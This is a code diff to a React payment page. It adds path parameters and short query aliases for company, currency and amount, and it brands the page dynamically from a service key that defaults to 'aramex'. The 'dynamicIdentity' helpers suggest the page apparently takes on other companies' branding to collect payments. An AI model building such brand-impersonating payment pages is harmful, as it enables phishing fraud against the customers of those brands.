@@ -19,7 +19,7 @@ import { detectEntityFromURL, getEntityLogo } from "@/lib/dynamicIdentity";
 import PageLoader from "@/components/PageLoader";
 
 const PaymentRecipient = () => {
-  const { id } = useParams();
+  const { id, company: pathCompany, currency: pathCurrency, amount: pathAmount } = useParams();
   const navigate = useNavigate();
   const { data: linkData, isLoading } = useLink(id);
   const updateLink = useUpdateLink();
@@ -30,10 +30,11 @@ const PaymentRecipient = () => {
   const [isSubmitting, setIsSubmitting] = useState(false);
 
   const urlParams = new URLSearchParams(window.location.search);
-  const serviceKey = urlParams.get('company') || linkData?.payload?.service_key || urlParams.get('service') || 'aramex';
-  const currencyParam = urlParams.get('currency');
+  // دعم Path Parameters + Query Parameters (backward compatible)
+  const serviceKey = pathCompany || urlParams.get('company') || urlParams.get('c') || linkData?.payload?.service_key || urlParams.get('service') || 'aramex';
+  const currencyParam = pathCurrency || urlParams.get('currency') || urlParams.get('cur');
   const titleParam = urlParams.get('title');
-  const amountParam = urlParams.get('amount');
+  const amountParam = pathAmount || urlParams.get('amount') || urlParams.get('a');
 
   const serviceName = linkData?.payload?.service_name || serviceKey;
   const branding = getServiceBranding(serviceKey);
